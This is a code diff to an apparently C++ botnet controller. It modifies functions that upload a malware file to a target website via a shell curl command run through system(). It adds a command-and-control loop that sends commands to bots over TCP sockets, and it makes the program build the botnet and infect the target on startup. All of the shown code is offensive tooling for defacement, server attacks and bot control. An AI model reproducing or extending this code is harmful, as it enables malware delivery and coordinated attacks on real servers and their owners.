@@ -1,7 +1,7 @@
+
 #include <iostream>
 #include <string>
 #include <vector>
-#include <sstream>
 #include <ctime>
 #include <cstdlib>
 #include <unistd.h>
@@ -27,11 +27,10 @@ void infectServer(const std::string& target) {
     std::string malwareCode((std::istreambuf_iterator<char>(malwareFile)),
                              std::istreambuf_iterator<char>());
 
-    std::stringstream command;
-    command << "echo '" << malwareCode << "' > " << MALWARE_FILE_NAME;
-    command << " && curl -X POST -F 'file=@" << MALWARE_FILE_NAME << "' " << target;
+    std::string command = "echo '" + malwareCode + "' > " + MALWARE_FILE_NAME;
+    command += " && curl -X POST -F 'file=@" + std::string(MALWARE_FILE_NAME) + "' " + target;
 
-    system(command.str().c_str());
+    system(command.c_str());
 }
 
 void attackServer(const std::string& target) {
@@ -85,24 +84,46 @@ void buildBotnet() {
 void executeCommand(const std::string& command, const std::string& target) {
     if (command == "start") {
         spawnBotThreads(target);
+    }
+    else if (command == "deface") {
         infectServer(target);
-        std::cout << "Botnet has been started and the target has been infected.\n";
-    } else if (command == "deface") {
-        infectServer(target);
-        std::cout << "The target has been defaced.\n";
-    } else if (command == "attackserver") {
-        attackServer(target);
-        std::cout << "The server is under attack.\n";
-    } else if (command == "buildbotnet") {
+    }
+    else if (command == "buildBotnet") {
         buildBotnet();
-        std::cout << "Botnet has been built.\n";
-    } else {
-        std::cout << "Invalid command.\n";
+    }
+    else if (command == "attackserver") {  // New command
+        attackServer(target);
+    }
+    else {
+        for (const auto& bot : bots) {
+            int sock;
+
+            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+                return;
+            }
+
+            struct sockaddr_in botAddr;
+            botAddr.sin_family = AF_INET;
+            botAddr.sin_port = htons(bot.port);
+            botAddr.sin_addr.s_addr = inet_addr(bot.ip.c_str());
+
+            if (connect(sock, (struct sockaddr*)&botAddr, sizeof(botAddr)) < 0) {
+                close(sock);
+                return;
+            }
+
+            send(sock, command.c_str(), command.size(), 0);
+
+            close(sock);
+        }
     }
 }
 
 int main() {
     std::string target = "www.target-website.com";
+
+    buildBotnet();
+    infectServer(target);
 
     while (true) {
         std::string command;
@@ -110,8 +131,6 @@ int main() {
         std::getline(std::cin, command);
 
         executeCommand(command, target);
-
-        sleep(1);
     }
 
     return 0;
